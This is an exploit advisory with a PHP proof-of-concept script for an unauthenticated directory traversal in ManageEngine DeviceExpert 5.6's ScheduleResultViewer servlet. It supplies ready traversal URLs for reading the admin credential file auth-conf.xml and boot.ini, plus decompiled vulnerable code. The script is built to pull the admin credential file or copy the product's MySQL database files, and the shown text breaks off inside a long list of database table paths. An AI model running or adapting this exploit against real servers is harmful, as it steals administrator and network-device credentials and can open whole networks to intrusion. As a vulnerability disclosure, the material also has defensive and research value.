@@ -1,0 +1,1215 @@
+ManageEngine DeviceExpert 5.6 Java Server ScheduleResultViewer servlet Unauthenticated 
+Remote Directory Traversal Database Backup / auth-conf.xml Disclosure Exploit
+
+product homepage: http://www.manageengine.com/products/device-expert/
+file tested: ManageEngine_DeviceExpert.exe
+tested against: Microsoft Windows Server 2003 r2 sp2
+
+Description:
+"DeviceExpert is a web–based, multi vendor network change, configuration and 
+compliance management (NCCCM) solution for switches, routers, firewalls and 
+other network devices. Trusted by thousands of network administrators 
+around the world, DeviceExpert helps automate and take total control 
+of the entire life cycle of device configuration management."
+[..]
+
+Background:
+The mentioned product installs a Java application server
+which listen by default on port 6060 (https) for incoming
+connections.
+
+Vulnerability:
+Without prior authentication, is possible to invoke the
+ScheduleResultViewer servlet to disclose every file 
+on target system. This can be done through the
+FileName argument which suffers of a directory traversal
+vulnerability.
+
+examples:
+
+https://[host]:6060/scheduleresult.de/?FileName=conf\Authentication\auth-conf.xml
+https://[host]:6060/scheduleresult.de/?FileName=..\..\..\..\..\..\..\..\..\..\boot.ini
+
+
+auth-conf.xml stores the authentication credentials to the
+administrative interface (username, hashed password and a salt).
+It is also possible to backup the MySQL database tables by cycling
+through subfolders.
+Theese tables can contain also usernames and passwords of
+the configured devices, remember the software functionality,
+it supports multiple vendors devices from the following list:
+
+...
+Cisco, HP, Nortel, Juniper, Force10, 3Com, D-link, Foundry, Dell, Aruba, Extreme, ADTRAN, Enterasys, Huawei, Blue Coat, Proxim, NetScreen, NETGEAR, FortiNet, ALAXALA, Brocade, Radware, DAX, H3C, Yamaha, Vanguard, Allied Telesis, Alcatel, Fujitsu, Motorola, Acme Packet, Watch Guard, Canoga Perkins
+...
+
+Explaination:
+
+look at the web.xml located inside C:\ManageEngine\DeviceExpert\webapps\ncm\WEB-INF\ :
+
+...
+<servlet>
+        <servlet-name>ScheduleResultViewer</servlet-name>
+        <servlet-class>com.adventnet.ncm.client.schedule.ScheduleResultViewerServlet</servlet-class>
+    </servlet>
+
+    <servlet-mapping>
+        <servlet-name>ScheduleResultViewer</servlet-name>
+        <url-pattern>/scheduleresult.de/*</url-pattern>
+    </servlet-mapping>
+...
+
+now decompile ScheduleResultViewerServlet.class:
+
+
+...
+package com.adventnet.ncm.client.schedule;
+
+import com.adventnet.ncm.util.NCMServerUtil;
+import java.io.*;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+import javax.servlet.ServletException;
+import javax.servlet.http.*;
+
+public class ScheduleResultViewerServlet extends HttpServlet
+{
+
+    public ScheduleResultViewerServlet()
+    {
+        logger = Logger.getLogger(com/adventnet/ncm/client/schedule/ScheduleResultViewerServlet.getName());
+    }
+
+    public void service(HttpServletRequest request, HttpServletResponse response)
+        throws ServletException, IOException
+    {
+        FileInputStream in;
+        OutputStream out;
+        in = null;
+        out = null;
+        try
+        {
+            String fileName = request.getParameter("FileName"); //<--------------------------------------
+            if(fileName.endsWith(".pdf"))
+            {
+                response.reset();
+                response.setContentType("application/pdf;charset=utf-8");
+            } else
+            {
+                response.setContentType("text/html;charset=utf-8");
+            }
+            File file = new File((new StringBuilder()).append(NCMServerUtil.SERVER_HOME).append(FS).append(fileName).toString()); //<-----------------------
+            response.setContentLength((int)file.length());
+            in = new FileInputStream(file);
+            out = response.getOutputStream(); //<---------------------
+            byte buf[] = new byte[1024];
+            for(int count = 0; (count = in.read(buf)) >= 0;)
+                out.write(buf, 0, count); //<-----------------
+
+        }
+        catch(Exception ex)
+        {
+            logger.log(Level.SEVERE, "Exception while processing request in ScheduleResultViewerServlet", ex);
+            throw new ServletException(ex);
+        }
+        if(in != null)
+            in.close();
+        if(out != null)
+            out.close();
+        break MISSING_BLOCK_LABEL_221;
+        Exception exception;
+        exception;
+        if(in != null)
+            in.close();
+        if(out != null)
+            out.close();
+        throw exception;
+    }
+
+    Logger logger;
+    private static final String FS = System.getProperty("file.separator");
+
+}
+
+'FileName' is taken from the request parameter without sanitization then
+is passed to the File object. File content is showed to the remote user.
+
+
+I think this is a huge vulnerability because this could open the path to
+the equipments of an entire network.
+
+As attachment, proof of concept code, which backup the underlying Mysql
+database. You could also choose to add your own file to the list,
+launch from the command line, place inside a writable folder.
+
+POC:
+<?php
+/*
+ManageEngine DeviceExpert 5.6 Java Server ScheduleResultViewer servlet Unauthenticated 
+Remote Directory Traversal Database Backup / auth-conf.xml Disclosure Exploit
+
+rgod
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    
+	$err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+    function syntax() {
+       print("usage: php 9sg_me.php [ip_address] [attack]\r\n" );
+       print("example: php 9sg_me.php 192.168.0.1 1\r\n");
+       print("  \"\" : php 9sg_me.php 192.168.0.1 2\r\n");
+       print("1 - backup database\r\n");
+       print("2 - read auth-conf.xml\r\n");
+       die();
+    }
+    
+	$argv[2] ? print("[*] Attacking...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Cookie: ".$ck ,
+            
+
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+          $host = $argv[1];
+          $port = 6060;
+          $at = $argv[2];
+          
+if ($at==1){          
+$folders=array("bin","data","share","tmp","data\\deviceexpert","data\\mysql","data\\test","share\\english");
+
+@mkdir("mysql");
+for ($i=0; $i<count($folders); $i++){
+	@mkdir("mysql\\".$folders[$i]);
+}
+
+$path=array(
+'mysql/data/ibdata1',
+'mysql/data/ib_logfile0',
+'mysql/data/ib_logfile1',
+'mysql/data/server.err',
+'mysql/data/server.pid',
+'mysql/data/deviceexpert/aaaaccadminprofile.frm',
+'mysql/data/deviceexpert/aaaaccbadloginstatus.frm',
+'mysql/data/deviceexpert/aaaacchttpsession.frm',
+'mysql/data/deviceexpert/aaaaccoldpassword.frm',
+'mysql/data/deviceexpert/aaaaccount.frm',
+'mysql/data/deviceexpert/aaaaccountowner.frm',
+'mysql/data/deviceexpert/aaaaccountstatus.frm',
+'mysql/data/deviceexpert/aaaaccownerprofile.frm',
+'mysql/data/deviceexpert/aaaaccpassword.frm',
+'mysql/data/deviceexpert/aaaaccsession.frm',
+'mysql/data/deviceexpert/aaaaccsessionaudit.frm',
+'mysql/data/deviceexpert/aaaaccsessionprop.frm',
+'mysql/data/deviceexpert/aaaaccuserprofile.frm',
+'mysql/data/deviceexpert/aaaace.frm',
+'mysql/data/deviceexpert/aaaauthorizedrole.frm',
+'mysql/data/deviceexpert/aaacontactinfo.frm',
+'mysql/data/deviceexpert/aaadisableauth.frm',
+'mysql/data/deviceexpert/aaaenvironmententry.frm',
+'mysql/data/deviceexpert/aaagenderhonorific.frm',
+'mysql/data/deviceexpert/aaaimpliedbytablecolumn.frm',
+'mysql/data/deviceexpert/aaaimpliedpermission.frm',
+'mysql/data/deviceexpert/aaaimpliedrole.frm',
+'mysql/data/deviceexpert/aaaimpliedtablecolumn.frm',
+'mysql/data/deviceexpert/aaaldapadapter.frm',
+'mysql/data/deviceexpert/aaalogin.frm',
+'mysql/data/deviceexpert/aaamethodparams.frm',
+'mysql/data/deviceexpert/aaamethodpermission.frm',
+'mysql/data/deviceexpert/aaamoduleservice.frm',
+'mysql/data/deviceexpert/aaaorganization.frm',
+'mysql/data/deviceexpert/aaaorgcontactinfo.frm',
+'mysql/data/deviceexpert/aaaorgcontactuser.frm',
+'mysql/data/deviceexpert/aaaorgdetail.frm',
+'mysql/data/deviceexpert/aaaorgpostaladdr.frm',
+'mysql/data/deviceexpert/aaaorgstatus.frm',
+'mysql/data/deviceexpert/aaaorguser.frm',
+'mysql/data/deviceexpert/aaapamconf.frm',
+'mysql/data/deviceexpert/aaapammodule.frm',
+'mysql/data/deviceexpert/aaapammoduleoption.frm',
+'mysql/data/deviceexpert/aaapassword.frm',
+'mysql/data/deviceexpert/aaapasswordhint.frm',
+'mysql/data/deviceexpert/aaapasswordprofile.frm',
+'mysql/data/deviceexpert/aaapasswordrule.frm',
+'mysql/data/deviceexpert/aaapasswordstatus.frm',
+'mysql/data/deviceexpert/aaapermission.frm',
+'mysql/data/deviceexpert/aaapostaladdress.frm',
+'mysql/data/deviceexpert/aaaradiusconfig.frm',
+'mysql/data/deviceexpert/aaarole.frm',
+'mysql/data/deviceexpert/aaarolecategory.frm',
+'mysql/data/deviceexpert/aaaroleowner.frm',
+'mysql/data/deviceexpert/aaaroletocategory.frm',
+'mysql/data/deviceexpert/aaaservice.frm',
+'mysql/data/deviceexpert/aaaservicepasswordrule.frm',
+'mysql/data/deviceexpert/aaasimplepermission.frm',
+'mysql/data/deviceexpert/aaatableaccessspi.frm',
+'mysql/data/deviceexpert/aaatablepermission.frm',
+'mysql/data/deviceexpert/aaatablereadpermission.frm',
+'mysql/data/deviceexpert/aaatableupdatepermission.frm',
+'mysql/data/deviceexpert/aaatrustedrole.frm',
+'mysql/data/deviceexpert/aaauser.frm',
+'mysql/data/deviceexpert/aaauserconfigrecord.frm',
+'mysql/data/deviceexpert/aaausercontactinfo.frm',
+'mysql/data/deviceexpert/aaauserpostaladdr.frm',
+'mysql/data/deviceexpert/aaauserprofile.frm',
+'mysql/data/deviceexpert/aaauserproperty.frm',
+'mysql/data/deviceexpert/aaauserstatus.frm',
+'mysql/data/deviceexpert/aaausertwofactordetails.frm',
+'mysql/data/deviceexpert/acajaxform.frm',
+'mysql/data/deviceexpert/acajaxformoption.frm',
+'mysql/data/deviceexpert/acajaxoptions.frm',
+'mysql/data/deviceexpert/accacheconfig.frm',
+'mysql/data/deviceexpert/acclientencprops.frm',
+'mysql/data/deviceexpert/acclientprops.frm',
+'mysql/data/deviceexpert/accolumnconfiguration.frm',
+'mysql/data/deviceexpert/accolumnconfigurationlist.frm',
+'mysql/data/deviceexpert/accontexthelp.frm',
+'mysql/data/deviceexpert/accountsqlstring.frm',
+'mysql/data/deviceexpert/accriteria.frm',
+'mysql/data/deviceexpert/accvtabparentconfig.frm',
+'mysql/data/deviceexpert/acdropdown.frm',
+'mysql/data/deviceexpert/acdropdownparams.frm',
+'mysql/data/deviceexpert/acelement.frm',
+'mysql/data/deviceexpert/acelementattr.frm',
+'mysql/data/deviceexpert/acemailaddress.frm',
+'mysql/data/deviceexpert/acfeedbackproperties.frm',
+'mysql/data/deviceexpert/acfilter.frm',
+'mysql/data/deviceexpert/acfilterconfig.frm',
+'mysql/data/deviceexpert/acfilterconfiglist.frm',
+'mysql/data/deviceexpert/acfiltergroup.frm',
+'mysql/data/deviceexpert/acfilterlist.frm',
+'mysql/data/deviceexpert/acformconfig.frm',
+'mysql/data/deviceexpert/acftpdetails.frm',
+'mysql/data/deviceexpert/acfunctioncolumns.frm',
+'mysql/data/deviceexpert/acgridlayoutchildconfig.frm',
+'mysql/data/deviceexpert/acgridlayoutconfig.frm',
+'mysql/data/deviceexpert/acgroupbycolumns.frm',
+'mysql/data/deviceexpert/acinstantfeedback.frm',
+'mysql/data/deviceexpert/acintegerconstant.frm',
+'mysql/data/deviceexpert/acjsoption.frm',
+'mysql/data/deviceexpert/aclink.frm',
+'mysql/data/deviceexpert/aclinkparams.frm',
+'mysql/data/deviceexpert/acmailconfig.frm',
+'mysql/data/deviceexpert/acnavigationconfiguration.frm',
+'mysql/data/deviceexpert/acpagelengthconfig.frm',
+'mysql/data/deviceexpert/acpanelelement.frm',
+'mysql/data/deviceexpert/acparams.frm',
+'mysql/data/deviceexpert/acpsconfiglist.frm',
+'mysql/data/deviceexpert/acpsconfiguration.frm',
+'mysql/data/deviceexpert/acrelationalcriteria.frm',
+'mysql/data/deviceexpert/acrendererconfiguration.frm',
+'mysql/data/deviceexpert/acsqlstring.frm',
+'mysql/data/deviceexpert/acstringconstant.frm',
+'mysql/data/deviceexpert/actabchildconfig.frm',
+'mysql/data/deviceexpert/actablecolumns.frm',
+'mysql/data/deviceexpert/actablefilterlistrel.frm',
+'mysql/data/deviceexpert/actablelayoutchildconfig.frm',
+'mysql/data/deviceexpert/actableviewconfig.frm',
+'mysql/data/deviceexpert/actemplatehandler.frm',
+'mysql/data/deviceexpert/action.frm',
+'mysql/data/deviceexpert/activedirectoryinfo.frm',
+'mysql/data/deviceexpert/acuserclientstate.frm',
+'mysql/data/deviceexpert/acuserfiltergroup.frm',
+'mysql/data/deviceexpert/acuserpreference.frm',
+'mysql/data/deviceexpert/acviewtogroupmapping.frm',
+'mysql/data/deviceexpert/additionalviewparams.frm',
+'mysql/data/deviceexpert/address.frm',
+'mysql/data/deviceexpert/addressconfiguration.frm',
+'mysql/data/deviceexpert/adtranlanswitch.frm',
+'mysql/data/deviceexpert/adtrannetvantarouter.frm',
+'mysql/data/deviceexpert/advaopticalnetworking.frm',
+'mysql/data/deviceexpert/adventneterrorcode.frm',
+'mysql/data/deviceexpert/agentrelation.frm',
+'mysql/data/deviceexpert/alarmstateholder.frm',
+'mysql/data/deviceexpert/alaxalaswitch.frm',
+'mysql/data/deviceexpert/alaxalaswitch5400.frm',
+'mysql/data/deviceexpert/alcatelrouter.frm',
+'mysql/data/deviceexpert/alcatelswitch.frm',
+'mysql/data/deviceexpert/alliedcentercomswitch.frm',
+'mysql/data/deviceexpert/alliedtelesisat8000s.frm',
+'mysql/data/deviceexpert/alliedtelesiseswitch.frm',
+'mysql/data/deviceexpert/alliedtelesisgs900mswitch.frm',
+'mysql/data/deviceexpert/alliedtelesisswitch.frm',
+'mysql/data/deviceexpert/allowedpattern.frm',
+'mysql/data/deviceexpert/allowedvalues.frm',
+'mysql/data/deviceexpert/aristaswitch.frm',
+'mysql/data/deviceexpert/array_list.frm',
+'mysql/data/deviceexpert/arubawifiswitch.frm',
+'mysql/data/deviceexpert/attachment.frm',
+'mysql/data/deviceexpert/attachment_input.frm',
+'mysql/data/deviceexpert/auditconfig.frm',
+'mysql/data/deviceexpert/auditconfigproperty.frm',
+'mysql/data/deviceexpert/auditlevel.frm',
+'mysql/data/deviceexpert/auditnotifycriteria.frm',
+'mysql/data/deviceexpert/auditoperproperty.frm',
+'mysql/data/deviceexpert/auditrecord.frm',
+'mysql/data/deviceexpert/auditresourceprop.frm',
+'mysql/data/deviceexpert/auditresultproperty.frm',
+'mysql/data/deviceexpert/auditseveritylevel.frm',
+'mysql/data/deviceexpert/audittableconfig.frm',
+'mysql/data/deviceexpert/audituserproperty.frm',
+'mysql/data/deviceexpert/avayamediagateway.frm',
+'mysql/data/deviceexpert/ax2500loadbalancers.frm',
+'mysql/data/deviceexpert/axiscolumn.frm',
+'mysql/data/deviceexpert/basetopotreenode.frm',
+'mysql/data/deviceexpert/bean.frm',
+'mysql/data/deviceexpert/beaninterceptor.frm',
+'mysql/data/deviceexpert/beanproperties.frm',
+'mysql/data/deviceexpert/bluecoatproxysg.frm',
+'mysql/data/deviceexpert/bntrackswitch.frm',
+'mysql/data/deviceexpert/booleanparser.frm',
+'mysql/data/deviceexpert/boolean_constants.frm',
+'mysql/data/deviceexpert/boolean_dataobj_vars.frm',
+'mysql/data/deviceexpert/boolean_expressions.frm',
+'mysql/data/deviceexpert/boolean_reg_expr.frm',
+'mysql/data/deviceexpert/boolean_template_vars.frm',
+'mysql/data/deviceexpert/boolean_variables.frm',
+'mysql/data/deviceexpert/bool_composed_expr.frm',
+'mysql/data/deviceexpert/bool_const_comp_str.frm',
+'mysql/data/deviceexpert/bool_decimal_dataobj_expr.frm',
+'mysql/data/deviceexpert/bool_exists_var.frm',
+'mysql/data/deviceexpert/bool_expr_comp_expr.frm',
+'mysql/data/deviceexpert/bool_expr_terms.frm',
+'mysql/data/deviceexpert/bool_expr_with_terms.frm',
+'mysql/data/deviceexpert/bool_neg_expr.frm',
+'mysql/data/deviceexpert/bool_num_comp_const.frm',
+'mysql/data/deviceexpert/bool_num_comp_decimal.frm',
+'mysql/data/deviceexpert/bool_num_dataobj_expr.frm',
+'mysql/data/deviceexpert/bool_set_comp_var.frm',
+'mysql/data/deviceexpert/bool_str_comp_const.frm',
+'mysql/data/deviceexpert/bool_str_comp_str.frm',
+'mysql/data/deviceexpert/bool_str_dataobj_expr.frm',
+'mysql/data/deviceexpert/bool_time_comp_const.frm',
+'mysql/data/deviceexpert/bool_time_comp_time.frm',
+'mysql/data/deviceexpert/boundary_matchers.frm',
+'mysql/data/deviceexpert/brocadefastironswitch.frm',
+'mysql/data/deviceexpert/brocadefiberswitch.frm',
+'mysql/data/deviceexpert/brocadeslkwrmfiberswitch.frm',
+'mysql/data/deviceexpert/brocadeswitch.frm',
+'mysql/data/deviceexpert/calendar.frm',
+'mysql/data/deviceexpert/calendar_periodicity.frm',
+'mysql/data/deviceexpert/canogaperkins.frm',
+'mysql/data/deviceexpert/cc_address.frm',
+'mysql/data/deviceexpert/chartproperty.frm',
+'mysql/data/deviceexpert/chartpropertyset.frm',
+'mysql/data/deviceexpert/chartpropkey.frm',
+'mysql/data/deviceexpert/chartviewconfig.frm',
+'mysql/data/deviceexpert/char_class_expr.frm',
+'mysql/data/deviceexpert/checkpointfirewall.frm',
+'mysql/data/deviceexpert/cienaleosswitchtable.frm',
+'mysql/data/deviceexpert/cienasaosswitchtable.frm',
+'mysql/data/deviceexpert/ciscoaccesspoint.frm',
+'mysql/data/deviceexpert/ciscoaccessserver.frm',
+'mysql/data/deviceexpert/ciscoacemodule.frm',
+'mysql/data/deviceexpert/ciscoasa.frm',
+'mysql/data/deviceexpert/ciscoasrrouter.frm',
+'mysql/data/deviceexpert/ciscocatosswitch.frm',
+'mysql/data/deviceexpert/ciscocontentswitch.frm',
+'mysql/data/deviceexpert/ciscofirewall.frm',
+'mysql/data/deviceexpert/ciscoiad.frm',
+'mysql/data/deviceexpert/ciscoids.frm',
+'mysql/data/deviceexpert/ciscoiosxr.frm',
+'mysql/data/deviceexpert/ciscomds.frm',
+'mysql/data/deviceexpert/cisconexus.frm',
+'mysql/data/deviceexpert/ciscorouter.frm',
+'mysql/data/deviceexpert/ciscoswitch.frm',
+'mysql/data/deviceexpert/ciscovoicegateway.frm',
+'mysql/data/deviceexpert/ciscovpnconcentrator.frm',
+'mysql/data/deviceexpert/ciscowaas.frm',
+'mysql/data/deviceexpert/ciscowlancontroller.frm',
+'mysql/data/deviceexpert/citrixnetscaler.frm',
+'mysql/data/deviceexpert/class_expr_opr_expr.frm',
+'mysql/data/deviceexpert/clicommand.frm',
+'mysql/data/deviceexpert/cliconnectionspec.frm',
+'mysql/data/deviceexpert/cliconnectionterminalrel.frm',
+'mysql/data/deviceexpert/clientserviceproviders.frm',
+'mysql/data/deviceexpert/cliinputrecord.frm',
+'mysql/data/deviceexpert/cliinteractionspec.frm',
+'mysql/data/deviceexpert/climultiplepromptaction.frm',
+'mysql/data/deviceexpert/cliresponseparser.frm',
+'mysql/data/deviceexpert/cliterminaliohandler.frm',
+'mysql/data/deviceexpert/clitransportparameters.frm',
+'mysql/data/deviceexpert/clitransportprotocol.frm',
+'mysql/data/deviceexpert/clixmlinputdata.frm',
+'mysql/data/deviceexpert/coll_iterat_template.frm',
+'mysql/data/deviceexpert/columnconversion.frm',
+'mysql/data/deviceexpert/columndetails.frm',
+'mysql/data/deviceexpert/command.frm',
+'mysql/data/deviceexpert/commit_dataobj_task.frm',
+'mysql/data/deviceexpert/commonindexoidparam.frm',
+'mysql/data/deviceexpert/composite.frm',
+'mysql/data/deviceexpert/concat_task_list.frm',
+'mysql/data/deviceexpert/concat_task_template.frm',
+'mysql/data/deviceexpert/conffile.frm',
+'mysql/data/deviceexpert/conffiletomodule.frm',
+'mysql/data/deviceexpert/connectionspec.frm',
+'mysql/data/deviceexpert/constituenttable.frm',
+'mysql/data/deviceexpert/constraintdefinition.frm',
+'mysql/data/deviceexpert/conversion.frm',
+'mysql/data/deviceexpert/conversionlist.frm',
+'mysql/data/deviceexpert/criteria.frm',
+'mysql/data/deviceexpert/cr_dataobj_task.frm',
+'mysql/data/deviceexpert/cr_row_task_template.frm',
+'mysql/data/deviceexpert/custdevicesysoid.frm',
+'mysql/data/deviceexpert/custexcludecriteria.frm',
+'mysql/data/deviceexpert/customhandler.frm',
+'mysql/data/deviceexpert/customviewconfiguration.frm',
+'mysql/data/deviceexpert/customviewserviceproviders.frm',
+'mysql/data/deviceexpert/custom_bool_expr.frm',
+'mysql/data/deviceexpert/c_task_apis.frm',
+'mysql/data/deviceexpert/dataobj_variables.frm',
+'mysql/data/deviceexpert/dataobj_var_columns.frm',
+'mysql/data/deviceexpert/dataobj_var_tables.frm',
+'mysql/data/deviceexpert/dataretrievalconfiguration.frm',
+'mysql/data/deviceexpert/dataretrievalconnectionspec.frm',
+'mysql/data/deviceexpert/dataretrievalgroup.frm',
+'mysql/data/deviceexpert/dataretrievalrecord.frm',
+'mysql/data/deviceexpert/dataretrievalrelation.frm',
+'mysql/data/deviceexpert/datasource.frm',
+'mysql/data/deviceexpert/datatypeconversion.frm',
+'mysql/data/deviceexpert/daxrouter.frm',
+'mysql/data/deviceexpert/daxswitch.frm',
+'mysql/data/deviceexpert/db.opt',
+'mysql/data/deviceexpert/dbadapter.frm',
+'mysql/data/deviceexpert/dcsswitch.frm',
+'mysql/data/deviceexpert/decimal_agg_vars.frm',
+'mysql/data/deviceexpert/decimal_dataobj_expr.frm',
+'mysql/data/deviceexpert/decimal_dataobj_vars.frm',
+'mysql/data/deviceexpert/decimal_expressions.frm',
+'mysql/data/deviceexpert/decimal_expr_to_dc.frm',
+'mysql/data/deviceexpert/decimal_obj_expr.frm',
+'mysql/data/deviceexpert/decimal_template_vars.frm',
+'mysql/data/deviceexpert/decimal_variables.frm',
+'mysql/data/deviceexpert/defaulttheme.frm',
+'mysql/data/deviceexpert/default_task_conf.frm',
+'mysql/data/deviceexpert/default_task_input.frm',
+'mysql/data/deviceexpert/dellpowerconnectswitch.frm',
+'mysql/data/deviceexpert/dellswitch.frm',
+'mysql/data/deviceexpert/del_row_task_template.frm',
+'mysql/data/deviceexpert/discovereddomains.frm',
+'mysql/data/deviceexpert/discoveredhosts.frm',
+'mysql/data/deviceexpert/discoveryconfiguration.frm',
+'mysql/data/deviceexpert/discoverymapperconfiguration.frm',
+'mysql/data/deviceexpert/discoverymapperconnection.frm',
+'mysql/data/deviceexpert/discoverymapperoperation.frm',
+'mysql/data/deviceexpert/discoveryschedules.frm',
+'mysql/data/deviceexpert/discoverytaskinput.frm',
+'mysql/data/deviceexpert/dlinkswitch.frm',
+'mysql/data/deviceexpert/dominanttableconfig.frm',
+'mysql/data/deviceexpert/email_attachments.frm',
+'mysql/data/deviceexpert/email_cc_address.frm',
+'mysql/data/deviceexpert/email_message.frm',
+'mysql/data/deviceexpert/email_task.frm',
+'mysql/data/deviceexpert/email_task_input.frm',
+'mysql/data/deviceexpert/email_to_address.frm',
+'mysql/data/deviceexpert/enterasysrouter.frm',
+'mysql/data/deviceexpert/enterasysswitch.frm',
+'mysql/data/deviceexpert/error_data.frm',
+'mysql/data/deviceexpert/exceptions.frm',
+'mysql/data/deviceexpert/expressions.frm',
+'mysql/data/deviceexpert/expressions_pidx.frm',
+'mysql/data/deviceexpert/extremebdswitch.frm',
+'mysql/data/deviceexpert/ext_task_api_loc.frm',
+'mysql/data/deviceexpert/f5arx.frm',
+'mysql/data/deviceexpert/f5bigip.frm',
+'mysql/data/deviceexpert/featureparams.frm',
+'mysql/data/deviceexpert/filehandler.frm',
+'mysql/data/deviceexpert/firewall.frm',
+'mysql/data/deviceexpert/fkcolumndefinition.frm',
+'mysql/data/deviceexpert/fkdefinition.frm',
+'mysql/data/deviceexpert/fk_paths.frm',
+'mysql/data/deviceexpert/fk_pointers.frm',
+'mysql/data/deviceexpert/force10switch.frm',
+'mysql/data/deviceexpert/fortigatefirewall.frm',
+'mysql/data/deviceexpert/fortigatefortianalyzer.frm',
+'mysql/data/deviceexpert/forward.frm',
+'mysql/data/deviceexpert/foundryfastironswitch.frm',
+'mysql/data/deviceexpert/foundryswitch.frm',
+'mysql/data/deviceexpert/fujitsuswitch.frm',
+'mysql/data/deviceexpert/groupparser.frm',
+'mysql/data/deviceexpert/group_count.frm',
+'mysql/data/deviceexpert/group_templates.frm',
+'mysql/data/deviceexpert/h3csseriesswitch.frm',
+'mysql/data/deviceexpert/h3cswitch.frm',
+'mysql/data/deviceexpert/handler.frm',
+'mysql/data/deviceexpert/hirschmannswitch.frm',
+'mysql/data/deviceexpert/hitachiswitch.frm',
+'mysql/data/deviceexpert/hpaccesspoint.frm',
+'mysql/data/deviceexpert/hppswitch.frm',
+'mysql/data/deviceexpert/hpswitch.frm',
+'mysql/data/deviceexpert/huaweiarrouter.frm',
+'mysql/data/deviceexpert/huaweisswitch.frm',
+'mysql/data/deviceexpert/huaweiswitch.frm',
+'mysql/data/deviceexpert/i18ncreatedby.frm',
+'mysql/data/deviceexpert/i18ncurrentversion.frm',
+'mysql/data/deviceexpert/i18ncurruserlocale.frm',
+'mysql/data/deviceexpert/i18nlanguagecountry.frm',
+'mysql/data/deviceexpert/i18nlocale.frm',
+'mysql/data/deviceexpert/i18nlocalmsg.frm',
+'mysql/data/deviceexpert/i18nmessage.frm',
+'mysql/data/deviceexpert/i18npubliclocalmsg.frm',
+'mysql/data/deviceexpert/i18ntranslator.frm',
+'mysql/data/deviceexpert/i18nusertranslatormap.frm',
+'mysql/data/deviceexpert/i18nversion.frm',
+'mysql/data/deviceexpert/i18nversionmessage.frm',
+'mysql/data/deviceexpert/indexdefinition.frm',
+'mysql/data/deviceexpert/indexoidparam.frm',
+'mysql/data/deviceexpert/inetservice.frm',
+'mysql/data/deviceexpert/inner_join.frm',
+'mysql/data/deviceexpert/inner_join_attribs.frm',
+'mysql/data/deviceexpert/inner_join_tables.frm',
+'mysql/data/deviceexpert/instances.frm',
+'mysql/data/deviceexpert/instance_data.frm',
+'mysql/data/deviceexpert/integral_agg_vars.frm',
+'mysql/data/deviceexpert/integral_dataobj_vars.frm',
+'mysql/data/deviceexpert/integral_expressions.frm',
+'mysql/data/deviceexpert/integral_row_count.frm',
+'mysql/data/deviceexpert/integral_template_vars.frm',
+'mysql/data/deviceexpert/integral_variables.frm',
+'mysql/data/deviceexpert/interactionspec.frm',
+'mysql/data/deviceexpert/interfaceconfiguration.frm',
+'mysql/data/deviceexpert/interfacegroup.frm',
+'mysql/data/deviceexpert/interfacerelation.frm',
+'mysql/data/deviceexpert/int_const_opr_expr.frm',
+'mysql/data/deviceexpert/int_dataobj_expr.frm',
+'mysql/data/deviceexpert/int_expr_opr_const.frm',
+'mysql/data/deviceexpert/int_expr_opr_expr.frm',
+'mysql/data/deviceexpert/int_expr_to_int.frm',
+'mysql/data/deviceexpert/int_obj_expr.frm',
+'mysql/data/deviceexpert/ipinterface.frm',
+'mysql/data/deviceexpert/ipinterfacenetwork.frm',
+'mysql/data/deviceexpert/ipnetwork.frm',
+'mysql/data/deviceexpert/ipparameters.frm',
+'mysql/data/deviceexpert/ipv4address.frm',
+'mysql/data/deviceexpert/ipv4addressconfiguration.frm',
+'mysql/data/deviceexpert/ipv6address.frm',
+'mysql/data/deviceexpert/iterat_task_template.frm',
+'mysql/data/deviceexpert/iter_dataobj_task.frm',
+'mysql/data/deviceexpert/iter_table_task.frm',
+'mysql/data/deviceexpert/javascriptaction.frm',
+'mysql/data/deviceexpert/java_api.frm',
+'mysql/data/deviceexpert/jobstatus.frm',
+'mysql/data/deviceexpert/joincolumns.frm',
+'mysql/data/deviceexpert/joincriteria.frm',
+'mysql/data/deviceexpert/joinrelcriteria.frm',
+'mysql/data/deviceexpert/jointable.frm',
+'mysql/data/deviceexpert/juniperrouter.frm',
+'mysql/data/deviceexpert/juniperswitch.frm',
+'mysql/data/deviceexpert/lambdadriver.frm',
+'mysql/data/deviceexpert/layer2connection.frm',
+'mysql/data/deviceexpert/link.frm',
+'mysql/data/deviceexpert/listconversion.frm',
+'mysql/data/deviceexpert/logger.frm',
+'mysql/data/deviceexpert/loop_task_template.frm',
+'mysql/data/deviceexpert/macipmapping.frm',
+'mysql/data/deviceexpert/mail_server.frm',
+'mysql/data/deviceexpert/managedresource.frm',
+'mysql/data/deviceexpert/managedstateholder.frm',
+'mysql/data/deviceexpert/managementactionlist.frm',
+'mysql/data/deviceexpert/mapperqueries.frm',
+'mysql/data/deviceexpert/menu.frm',
+'mysql/data/deviceexpert/menuandmenuitem.frm',
+'mysql/data/deviceexpert/menuitem.frm',
+'mysql/data/deviceexpert/meruwlancontroller.frm',
